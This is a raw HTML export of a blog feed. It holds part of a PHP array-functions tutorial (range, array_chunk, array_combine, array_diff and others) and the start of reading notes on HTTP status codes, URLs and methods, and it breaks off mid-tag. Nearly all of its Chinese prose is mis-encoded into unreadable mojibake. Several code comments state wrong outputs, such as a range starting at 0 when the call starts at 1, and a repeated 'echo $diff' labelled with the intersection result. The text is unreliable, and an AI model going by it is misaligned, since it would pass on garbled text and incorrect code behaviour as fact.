class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$baseInfo = [</span><br><span class="line">    <span class="string">'jack'</span> =&gt; [</span><br><span class="line">        <span class="string">'age'</span> =&gt; <span class="number">22</span>,</span><br><span class="line">        <span class="string">'tel'</span> =&gt; <span class="string">'56710937'</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">'rose'</span> =&gt; [</span><br><span class="line">        <span class="string">'age'</span> =&gt; <span class="number">21</span>,</span><br><span class="line">        <span class="string">'tel'</span> =&gt; <span class="string">'578391038'</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$extInfo = [</span><br><span class="line">    <span class="string">'jack'</span> =&gt; [</span><br><span class="line">        <span class="string">'addrs'</span> =&gt; <span class="string">'NYC'</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">'rose'</span> =&gt; [</span><br><span class="line">        <span class="string">'addrs'</span> =&gt; <span class="string">'London'</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> json_encode(array_merge_recursive($baseInfo, $extInfo));</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"jack"</span>:&#123;</span><br><span class="line">        <span class="attr">"age"</span>:<span class="number">22</span>,</span><br><span class="line">        <span class="attr">"tel"</span>:<span class="string">"56710937"</span>,</span><br><span class="line">        <span class="attr">"addrs"</span>:<span class="string">"NYC"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"rose"</span>:&#123;</span><br><span class="line">        <span class="attr">"age"</span>:<span class="number">21</span>,</span><br><span class="line">        <span class="attr">"tel"</span>:<span class="string">"578391038"</span>,</span><br><span class="line">        <span class="attr">"addrs"</span>:<span class="string">"London"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-range"><a href="#10-range" class="headerlink" title="10. range"></a>10. range</h2><p>ç”ŸæˆæŒ‡å®šåŒºé—´çš„æ•°ç»„</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">range(<span class="number">0</span>, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>æŒ‡å®šæ­¥é•¿ä¸º 10</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">range(<span class="number">1</span>, <span class="number">100</span>, <span class="number">10</span>); <span class="comment">// [0,10,20,30,40,50,60,70,80,90,100]</span></span><br></pre></td></tr></table></figure><p>å¦‚æœèµ·å§‹å€¼å¤§äºç»“æŸå€¼ï¼Œåˆ™ä¼šæŒ‰ç…§é€’å‡çš„é¡ºåºç”Ÿæˆ</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">range(<span class="number">100</span>, <span class="number">0</span>, <span class="number">10</span>); <span class="comment">// [100,90,80,70,60,50,40,30,20,10,0]</span></span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªå‚æ•°ä¹Ÿå¯ä»¥æ˜¯æµ®ç‚¹æ•°</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">range(<span class="number">12.8</span>, <span class="number">2.2</span>, <span class="number">2.5</span>); <span class="comment">// [12.8, 10.3, 7.8, 5.3, 2.8]</span></span><br></pre></td></tr></table></figure><p><code>$start</code> å’Œ <code>$end</code> å¦‚æœå…¨éƒ¨æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¼š<strong>å–ä¸¤ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—æ¯</strong>ï¼Œå¹¶æŒ‰ç…§ ASCII å­—æ¯é¡ºåºè¡¨ï¼Œå–æ­¥é•¿å¯¹åº”çš„å€¼</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">range</span>(<span class="string">'a'</span>, <span class="string">'i'</span>); // [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"e"</span>,<span class="string">"f"</span>,<span class="string">"g"</span>,<span class="string">"h"</span>,<span class="string">"i"</span>]</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•ä½¿ç”¨<code>range()</code>æ¥è¾“å‡º <a href="https://zh.wikipedia.org/wiki/ASCII" target="_blank" rel="noopener">ASCII</a> çš„æ‰€æœ‰å¯è§å­—ç¬¦å‘¢ï¼Ÿï¼Œè¿™åœ¨PHPä¸­éå¸¸ç®€å•ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">range</span>(<span class="string">' '</span>, <span class="string">'~'</span>);</span><br></pre></td></tr></table></figure><h2 id="11-array-chunk"><a href="#11-array-chunk" class="headerlink" title="11. array_chunk"></a>11. array_chunk</h2><p>å¦‚æœæˆ‘ä»¬éœ€è¦å°†ä¸€ä¸ªæ•°ç»„æ‹†åˆ†ä¸ºå¤šä¸ªæ•°ç»„ï¼Œå°±å¯ä»¥é€šè¿‡<code>array_chunk()</code>å¿«é€Ÿå®ç°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$input_array = <span class="keyword">array</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode(array_chunk($input_array, <span class="number">2</span>)),PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> json_encode(array_chunk($input_array, <span class="number">2</span>, <span class="keyword">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// [["a","b"],["c","d"],["e"]]</span></span><br><span class="line"><span class="comment">// [["a","b"],&#123;"2":"c","3":"d"&#125;,&#123;"4":"e"&#125;]</span></span><br></pre></td></tr></table></figure><h2 id="12-array-combine"><a href="#12-array-combine" class="headerlink" title="12. array_combine"></a>12. array_combine</h2><p>ç°åœ¨æœ‰ä¸¤ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸€ä¸ªæ•°ç»„çš„å…ƒç´ åš<code>key</code>ï¼Œå¦ä¸€ä¸ªæ•°ç»„çš„å…ƒç´ åš<code>value</code>ï¼Œåˆå¹¶ä¸ºä¸€ä¸ªæ•°ç»„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">array</span>(<span class="string">'green'</span>, <span class="string">'red'</span>, <span class="string">'yellow'</span>);</span><br><span class="line">$b = <span class="keyword">array</span>(<span class="string">'avocado'</span>, <span class="string">'apple'</span>, <span class="string">'banana'</span>);</span><br><span class="line">$c = array_combine($a, $b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> json_encode($c);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;"green":"avocado","red":"apple","yellow":"banana"&#125;</span></span><br></pre></td></tr></table></figure><h2 id="13-extract"><a href="#13-extract" class="headerlink" title="13. extract"></a>13. extract</h2><h2 id="14-compact"><a href="#14-compact" class="headerlink" title="14. compact"></a>14. compact</h2><h2 id="15-array-diff-amp-array-intersect"><a href="#15-array-diff-amp-array-intersect" class="headerlink" title="15. array_diff &amp; array_intersect"></a>15. array_diff &amp; array_intersect</h2><p>å¦‚æœéœ€è¦æ±‚æ•°ç»„å…ƒç´ çš„å·®é›†/äº¤é›†ï¼Œå¯ä»¥ä½¿ç”¨<code>array_diff($array1, $array2[,$arrayn])</code>ï¼Œè¿™å°†è¿”å›å­˜åœ¨äº<code>$array1</code>ä¸­è€Œä¸å­˜åœ¨å…¶ä»– array ä¸­å€¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array1 = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"green"</span>, <span class="string">"red"</span>, <span class="string">"blue"</span>, <span class="string">"red"</span>);</span><br><span class="line">$array2 = <span class="keyword">array</span>(<span class="string">"b"</span> =&gt; <span class="string">"green"</span>, <span class="string">"yellow"</span>, <span class="string">"red"</span>);</span><br><span class="line">$diff = array_diff($array1, $array2);</span><br><span class="line">$intersect = array_intersect($array1, $array2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> json_encode($diff); <span class="comment">// &#123;"1":"blue"&#125;</span></span><br><span class="line"><span class="keyword">echo</span> json_encode($diff); <span class="comment">// &#123;"a":"green","0":"red","2":"red"&#125;</span></span><br></pre></td></tr></table></figure><h2 id="16-array-diff-key-amp-array-intersect-key"><a href="#16-array-diff-key-amp-array-intersect-key" class="headerlink" title="16. array_diff_key &amp; array_intersect_key"></a>16. array_diff_key &amp; array_intersect_key</h2><p>é¡¾åæ€ä¹‰ï¼Œä½¿ç”¨é”®åè®¡ç®—æ•°ç»„çš„å·®é›†/äº¤é›†ï¼ŒåŒæ ·æ˜¯è¿”å›å­˜åœ¨äº<code>$array1</code>ä¸­è€Œä¸å­˜åœ¨ä¸å…¶ä»–<code>$array</code>ä¸­çš„å€¼ã€‚</p><h2 id="17-array-diff-assoc-amp-array-intersect-assoc"><a href="#17-array-diff-assoc-amp-array-intersect-assoc" class="headerlink" title="17. array_diff_assoc &amp; array_intersect_assoc"></a>17. array_diff_assoc &amp; array_intersect_assoc</h2><p>è¯¥å‡½æ•°ä¼šå°†é”®åä¸å…ƒç´ éƒ½ä½œä¸ºæ¯”è¾ƒæ¡ä»¶ã€‚</p><h2 id="18-version-compare"><a href="#18-version-compare" class="headerlink" title="18. version_compare"></a>18. version_compare</h2><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨ç¬¬ä¸€ä¸ªç‰ˆæœ¬ä½äºç¬¬äºŒä¸ªæ—¶ï¼Œversion_compare() è¿”å› -1ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ï¼›ç¬¬äºŒä¸ªç‰ˆæœ¬æ›´ä½æ—¶åˆ™è¿”å› 1ã€‚(ç±»ä¼¼äºå¤ªç©ºæ“ä½œç¬¦)))</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo version_compare('<span class="number">5.3</span><span class="number">.0</span>', '<span class="number">7.1</span><span class="number">.4</span>'); <span class="comment">// -1</span></span><br></pre></td></tr></table></figure><h2 id="19-number-format"><a href="#19-number-format" class="headerlink" title="19. number_format"></a>19. number_format</h2><p>è¯¥å‡½æ•°ç”¨äºæ ¼å¼åŒ–æ•°å­—ï¼Œèƒ½å®ç°</p><ul><li>æ˜¯å¦ä¿ç•™å°æ•°</li><li>æ•°å­—çš„ç²¾åº¦</li><li>è‡ªå®šä¹‰åƒåˆ†ä½åˆ†éš”ç¬¦ä¸å°æ•°ç‚¹åˆ†éš”ç¬¦</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span> = 123456.789;</span><br><span class="line"><span class="built_in">echo</span> number_format(<span class="variable">$num</span>),PHP_EOL;</span><br><span class="line"><span class="built_in">echo</span> number_format(<span class="variable">$num</span>, 2),PHP_EOL;</span><br><span class="line"><span class="built_in">echo</span> number_format(<span class="variable">$num</span>, 1, <span class="string">','</span>, <span class="string">'/'</span>),PHP_EOL;</span><br></pre></td></tr></table></figure><h2 id="20-trim"><a href="#20-trim" class="headerlink" title="20. trim"></a>20. trim</h2><p><code>tirm()</code>å¯ä»¥å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šå¾…åˆ é™¤çš„å­—ç¬¦åˆ—è¡¨ï¼Œåˆ™ä¼šåˆ é™¤ä»¥ä¸‹å­—ç¬¦ï¼š</p><ul><li>â€œ â€œ (ASCII 32 (0x20))ï¼Œæ™®é€šç©ºæ ¼ç¬¦ã€‚</li><li>â€œ\tâ€ (ASCII 9 (0x09))ï¼Œåˆ¶è¡¨ç¬¦ã€‚</li><li>â€œ\nâ€ (ASCII 10 (0x0A))ï¼Œæ¢è¡Œç¬¦ã€‚</li><li>â€œ\râ€ (ASCII 13 (0x0D))ï¼Œå›è½¦ç¬¦ã€‚</li><li>â€œ\0â€ (ASCII 0 (0x00))ï¼Œç©ºå­—èŠ‚ç¬¦ã€‚</li><li>â€œ\x0Bâ€ (ASCII 11 (0x0B))ï¼Œå‚ç›´åˆ¶è¡¨ç¬¦ã€‚</li></ul><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½ä¼šæŒ‡å®šåˆ é™¤çš„å­—ç¬¦åˆ—è¡¨</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">trim</span>(<span class="string">'@appleâ€¦â€¦'</span>, <span class="string">'@#ï¿¥%â€¦â€¦'</span>); <span class="comment">// apple</span></span><br></pre></td></tr></table></figure><p>tips: è¯¥å‡½æ•°ä¸<code>array_map()</code>åŒæ—¶æœç”¨ï¼Œæ•ˆæœæ›´ä½³ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŠHTTPæƒå¨æŒ‡å—ã€‹</title>
      <link href="/post/http-definitive-guide/"/>
      <url>/post/http-definitive-guide/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1g9w8q5c92zj30xc0hi434.jpg" alt=""></p><a id="more"></a><h1 id="ç¬¬1ç« -HTTP-æ¦‚è¿°"><a href="#ç¬¬1ç« -HTTP-æ¦‚è¿°" class="headerlink" title="ç¬¬1ç«  HTTP æ¦‚è¿°"></a>ç¬¬1ç«  HTTP æ¦‚è¿°</h1><p>http é€šè¿‡ä¸º web ä¼ è¾“çš„å¯¹è±¡æ‰“ä¸Š MIME æ¥åŒºåˆ†æ•°æ®ç±»å‹ã€‚MIME è®¾è®¡ä¹‹åˆè¢«ç”¨äºè§£å†³åœ¨ä¸åŒç”µå­é‚®ä»¶é—´ç§»åŠ¨æŠ¥æ–‡æ—¶å­˜åœ¨çš„é—®é¢˜ã€‚MIME ç±»å‹é€šè¿‡ä¸»è¦çš„å¯¹è±¡ç±»å‹ä¸ç‰¹å®šçš„å­ç±»å‹æ¥è¡¨ç¤ºï¼Œå¦‚ï¼štext/plainã€‚å®Œæ•´çš„ MIME ç±»å‹å‚è§<a href="https://www.iana.org/assignments/media-types/media-types.xhtml" target="_blank" rel="noopener">Media Types - IANA</a></p><h2 id="HTTPçŠ¶æ€ç "><a href="#HTTPçŠ¶æ€ç " class="headerlink" title="HTTPçŠ¶æ€ç "></a>HTTPçŠ¶æ€ç </h2><table><thead><tr><th>çŠ¶æ€ç </th><th>ç±»åˆ«</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>1XX</td><td>Informational</td><td>æ¥æ”¶çš„è¯·æ±‚æ­£åœ¨å¤„ç†</td></tr><tr><td>2XX</td><td>Success</td><td>è¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯•</td></tr><tr><td>3XX</td><td>Redirection</td><td>é‡å®šå‘</td></tr><tr><td>4XX</td><td>Client Error</td><td>å®¢æˆ·ç«¯é”™è¯¯</td></tr><tr><td>5XX</td><td>Server Error</td><td>æœåŠ¡å™¨ç«¯é”™è¯¯</td></tr></tbody></table><blockquote><p>ä¸šåŠ¡çŠ¶æ€ç åº”è¯¥ä¸ HTTP çŠ¶æ€ç æ··ç”¨å—ï¼Ÿ<br>æ ¹æ®ä¸ªäººçš„ç»éªŒï¼Œä¸å»ºè®®è¿™æ ·ä½¿ç”¨ã€‚å¾ˆå¤šç¨‹åºå‘˜éƒ½å–œæ¬¢å°†200ä½œä¸ºä¸šåŠ¡æˆåŠŸå¤„ç†è¿”å›ï¼Œä»£ç é€»è¾‘ catch ä½œä¸º 500 å¤„ç†ã€‚è¿™æ ·å¯¼è‡´ HTTP çŠ¶æ€ä¸ä¸šåŠ¡çŠ¶æ€æ··ä¹±ï¼Œéš¾ä»¥ç»´æŠ¤ï¼Œæ¯”å¦‚ï¼Œä¸€ä¸ªè¯·æ±‚å¾—åˆ°äº† 500 çš„å“åº”ï¼Œæˆ‘ä¸çŸ¥é“æ˜¯æœåŠ¡å™¨èµ„æºå¯¼è‡´çš„å†…éƒ¨é”™è¯¯è¿˜æ˜¯æˆ‘æœ¬æ¬¡è¯·æ±‚çš„ä»£ç é€»è¾‘é”™è¯¯ï¼Œè¿™å¢åŠ äº†è°ƒè¯•çš„éš¾åº¦ã€‚<br>ä¸ªäººå»ºè®®ä»¥<code>0</code>ä½œä¸ºä¸šåŠ¡ç çš„æˆåŠŸå“åº”ç ï¼Œå¤§äº 0 çš„å€¼ä½œä¸ºé”™è¯¯ç ï¼Œå¹¶ä¸”å¦‚ HTTP å°†é”™è¯¯ç åˆ†æ®µå¤„ç†ï¼Œæ¯”å¦‚ 1xxx ä»£è¡¨ä¼ å…¥å‚æ•°å¼‚å¸¸ï¼Œ2xxx ä»£è¡¨ç›¸å…³è¯·æ±‚é™åˆ¶ç­‰ï¼Œå†…éƒ¨ç»´æŠ¤è¿™æ ·çš„é”™è¯¯å…³ç³»ã€‚<br>å½“ä¸€ä¸ªè¯·æ±‚ä¼ å…¥äº†éæ³•å‚æ•°æ—¶ï¼Œhttp çŠ¶æ€ç ä¸º 200ï¼Œä¸šåŠ¡çŠ¶æ€ç ä¸º 1001ï¼Œè¿™æ ·å¾ˆæ¸…æ™°çš„å¾—åˆ°ç½‘ç»œåŠæœåŠ¡é€šè®¯æ­£å¸¸ï¼Œä¸šåŠ¡å¤„ç†å¼‚å¸¸ï¼Œå¹¶é€šè¿‡ç®€å•çš„æç¤ºä¿¡æ¯è¿›è¡Œçº é”™å¤„ç†ã€‚<br>åœ¨é”™è¯¯çŠ¶æ€è¿”å›æ—¶ï¼Œè¿˜éœ€è¦æœ‰ç›¸åº”ç®€æ´çš„é”™è¯¯æè¿°ï¼Œä»¥åŠçº é”™å¤„ç†ï¼Œè€Œä¸”åœ¨ç»™æ™®é€šç”¨æˆ·æ˜¾ç¤ºä»£ç é€»è¾‘é”™è¯¯æ—¶ï¼Œåº”å½“é‡ç‚¹å±•ç¤ºé”™è¯¯ç ï¼Œå› ä¸ºæ–‡å­—å¾ˆå®¹æ˜“åœ¨è¡¨è¿°è¿‡ç¨‹ä¸­åç¦»å…¶å«ä¹‰ï¼Œé”™è¯¯ç åˆ™æœ‰æ•ˆè§£å†³äº†è¯¥é—®é¢˜ã€‚å…³äºé”™è¯¯ç ï¼Œå¾®ä¿¡å…¬ä¼—å·çš„å¼€å‘æ–‡æ¡£å°±æœ‰å¾ˆå¥½çš„ç¤ºä¾‹ï¼Œå¯<a href="https://developers.weixin.qq.com/doc/offiaccount/Getting_Started/Global_Return_Code.html" target="_blank" rel="noopener">ç‚¹å‡»æ­¤å¤„</a>æŸ¥çœ‹ã€‚</p></blockquote><p>æˆ‘åº”è¯¥ä½¿ç”¨ RESTful å¼€å‘å—ï¼Ÿ<br>æˆ‘è®¤ä¸ºæ¯ä¸ªæ ‡å‡†æ¥å£éƒ½åº”è¯¥æ˜¯ RESTful çš„ã€‚å¾ˆå¤šå¼€å‘è€…å¯èƒ½åªç”¨åˆ°<code>GET</code>æˆ–è€…<code>POST</code>ï¼Œæˆ–è€…ä¸€ä¸ª<code>POST</code>èµ°å¤©ä¸‹ã€‚è¿™ç§å¼€å‘ä¹ æƒ¯ä¼šå¯¼è‡´æ¥å£è¯­ä¹‰ä¸æ¸…ï¼Œä»£ç è€¦åˆï¼ŒHTTP ä¸­çš„å¤šç§è¯·æ±‚æ–¹å¼å¯ä»¥æ›´åŠ æ¸…æ™°çš„è§£å†³è¯¥é—®é¢˜ï¼Œå¦‚<code>PUT</code>ç”¨äºè¡¨ç¤ºåˆ›å»ºèµ„æºï¼Œ<code>GET</code>è¡¨ç¤ºè·å–èµ„æºï¼Œä¸”è¯¥è¯·æ±‚å…è®¸æ˜¯å¹‚ç­‰çš„ï¼Œ<code>DELETE</code>è¡¨ç¤ºåˆ é™¤èµ„æºï¼Œ<code>POST</code>è¡¨ç¤ºä¿®æ”¹èµ„æºï¼Œå°†æ‰€æœ‰çš„è¯·æ±‚ç³…åˆåœ¨ä¸€ä¸ª<code>POST</code>ä¸­ï¼Œæ˜¾ç„¶ä¸æ˜¯ä¸€ç§è‰¯å¥½çš„è®¾è®¡å®ç°ã€‚</p><p>HTTP ä¸ HPPTS ç½‘ç»œåè®®æ ˆ<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9wbf070kyj30ej06igm3.jpg" alt=""></p><h2 id="Webçš„ç»“æ„ç»„ä»¶"><a href="#Webçš„ç»“æ„ç»„ä»¶" class="headerlink" title="Webçš„ç»“æ„ç»„ä»¶"></a>Webçš„ç»“æ„ç»„ä»¶</h2><ul><li>ä»£ç†<ul><li>ä»£ç†çš„ä½œç”¨æœ‰ï¼šâ‘ éšè—çœŸå®è®¿é—®è€…ï¼Œå¦‚åŒ¿åä»£ç†ï¼›â‘¡å®ç°æµé‡çš„æ§åˆ¶ä¸åˆ†æï¼Œå¦‚é€šè¿‡ä»£ç†æ§åˆ¶æŸäº›ç½‘ç«™çš„è®¿é—®</li></ul></li><li>ç¼“å­˜</li><li>ç½‘å…³<ul><li>åœ¨å±€åŸŸç½‘é€šè¿‡è·¯ç”±æ¥å…¥ç½‘ç»œçš„ç¯å¢ƒä¸­ï¼Œç½‘å…³æŒ‡ç”¨äºè¿æ¥å±€åŸŸç½‘å’Œ Internetã€‚ç½‘å…³ä¹Ÿå¸¸æŒ‡æŠŠä¸€ç§åè®®å°è£…ä¸ºå¦ä¸€ç§åè®®çš„è®¾å¤‡ï¼Œå¦‚è¯­éŸ³ç½‘å…³ã€‚</li></ul></li><li>éš§é“</li><li>Agent ä»£ç†<ul><li>å¦‚æœç´¢å¼•æ“çš„çˆ¬è™«</li></ul></li></ul><h1 id="ç¬¬2ç« -URL-ä¸èµ„æº"><a href="#ç¬¬2ç« -URL-ä¸èµ„æº" class="headerlink" title="ç¬¬2ç«  URL ä¸èµ„æº"></a>ç¬¬2ç«  URL ä¸èµ„æº</h1><h2 id="URL-çš„å„ç§å½¢å¼"><a href="#URL-çš„å„ç§å½¢å¼" class="headerlink" title="URL çš„å„ç§å½¢å¼"></a>URL çš„å„ç§å½¢å¼</h2><p>å¤§å¤šæ•°çš„URLè¯­æ³•éƒ½å»ºç«‹åœ¨<code>&lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;</code>çš„é€šç”¨æ ¼å¼ä¸Šï¼Œä½†æœ€é‡è¦çš„ä¸‰ä¸ªéƒ¨åˆ†æ˜¯ç”±<code>scheme://host/path</code>ç»„æˆã€‚</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>:<span class="comment">//www.example.com:80</span></span><br><span class="line"><span class="attribute">ftp</span>:<span class="comment">//ftp.example.com</span></span><br><span class="line"><span class="attribute">ssh</span>:<span class="comment">//example.github.com</span></span><br><span class="line"><span class="attribute">mailto</span>:username<span class="variable">@example</span>.com</span><br></pre></td></tr></table></figure><p>å¯¹äºä¸€ä¸ª GET è¯·æ±‚<code>http://www.example.com/index.php?item=1245&amp;color=blue</code>ï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•ç†è§£å‘¢ï¼Ÿ<br>è¯¥ URL ä¸­çš„<code>?</code>è¡¨ç¤ºå‘æœåŠ¡å™¨è¯¢é—®/æŸ¥è¯¢ï¼ŒæŸ¥è¯¢ä»€ä¹ˆå‘¢ï¼Ÿç¼–å·ä¸º 12456 å’Œé¢œè‰²ä¸ºè“è‰²çš„å•†å“ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½ä» URL ä¸­è·å¾—æ¸…æ™°çš„è¯­ä¹‰äº†ã€‚</p><h1 id="ç¬¬3ç« -HTTP-æŠ¥æ–‡"><a href="#ç¬¬3ç« -HTTP-æŠ¥æ–‡" class="headerlink" title="ç¬¬3ç«  HTTP æŠ¥æ–‡"></a>ç¬¬3ç«  HTTP æŠ¥æ–‡</h1><h2 id="å¸¸ç”¨çš„-HTTP-æ–¹æ³•"><a href="#å¸¸ç”¨çš„-HTTP-æ–¹æ³•" class="headerlink" title="å¸¸ç”¨çš„ HTTP æ–¹æ³•"></a>å¸¸ç”¨çš„ HTTP æ–¹æ³•</h2><table><thead><tr><th>æ–¹æ³•</th><th>æè¿°</th><th>æ˜¯å¦åŒ…å«ä¸»ä½“</th></tr></thead><tbody><tr><td><code>GET</code></td><td>ä»æœåŠ¡å™¨è·å–å†…å®¹</td><td>å¦</td></tr><tr><td><code>POST</code></td><td>å‘æœåŠ¡å™¨å‘é€éœ€è¦å¤„ç†çš„æ•°æ®</td><td>æ˜¯</td></tr><tr><td><code>PUT</code></td><td>å°†è¯·æ±‚ä¸»ä½“å†…å®¹å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­</td><td>æ˜¯</td></tr><tr><td><code>DELETE</code></td><td>ä»æœåŠ¡å™¨åˆ é™¤æ–‡ä»¶</td><td>å¦</td></tr><tr><td><code>HEAD</code></td><td>åªä»æœåŠ¡å™¨è·å–æ–‡æ¡£çš„é¦–éƒ¨</td><td>å¦</td></tr><tr><td><code>TRACE</code></td><td>å¯¹å¯èƒ½ç»è¿‡ä»£ç†æœåŠ¡å™¨ä¼ é€åˆ°æœåŠ¡å™¨ä¸Šçš„æŠ¥æ–‡è¿›è¡Œè¿½è¸ª</td><td>å¦</td></tr><tr><td><code>OPTIONS</code></td><td>å†³å®šå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œå“ªäº›æ–¹æ³•</td><td>å¦</td></tr></tbody></table><p> POST ä¸ PUT çš„ä¸åŒä¹‹å¤„åœ¨äºï¼ŒPUT è¡¨ç¤ºå¯¹èµ„æºè¿›è¡Œæ•´ä½“è¦†ç›–ï¼Œè€Œ POST åˆ™è¡¨ç¤ºå¯¹èµ„æºçš„éƒ¨åˆ†ä¿®æ”¹ã€‚</p><p>HEAD å…è®¸å®¢æˆ·ç«¯åœ¨æœªè·å–å®é™…èµ„æºçš„æƒ…å†µä¸‹ï¼Œå¯¹èµ„æºçš„é¦–éƒ¨è¿›è¡Œæ£€æŸ¥ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ HEAD æ¥å®ç°ï¼š</p><ul><li>åœ¨ä¸è·å–èµ„æºçš„æƒ…å†µä¸‹äº†è§£èµ„æºçš„æƒ…å†µï¼Œå¦‚åˆ¤æ–­èµ„æºç±»å‹</li><li>é€šè¿‡æŸ¥çœ‹å“åº”ä¸­çš„çŠ¶æ€ç ï¼Œåˆ¤æ–­æŸä¸ªå¯¹è±¡æ˜¯å¦å­˜åœ¨</li><li>é€šè¿‡æŸ¥çœ‹é¦–éƒ¨ï¼Œæµ‹è¯•èµ„æºæ˜¯å¦è¢«ä¿®æ”¹</li></ul><p>å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œè¿™ä¸ªè¯·æ±‚é¢èƒ½è¦ç©¿è¿‡é˜²ç«å¢™ã€ä»£ç†ã€ç½‘å…³æˆ–è€…å…¶ä»–ä¸€äº›åº”ç”¨ç¨‹åºã€‚æ¯ä¸ªä¸­é—´èŠ‚ç‚¹éƒ½å¯èƒ½ä¼šä¿®æ”¹åŸå§‹çš„ HTTP è¯·æ±‚ï¼ŒTRACE å…è®¸å®¢æˆ·ç«¯åœ¨æœ€ç»ˆè¯·æ±‚å‘é€ç»™æœåŠ¡å™¨æ—¶ï¼ŒæŸ¥çœ‹è¯·æ±‚çš„å˜åŒ–ã€‚</p><h2 id="å¸¸ç”¨-HTTP-çŠ¶æ€ç "><a 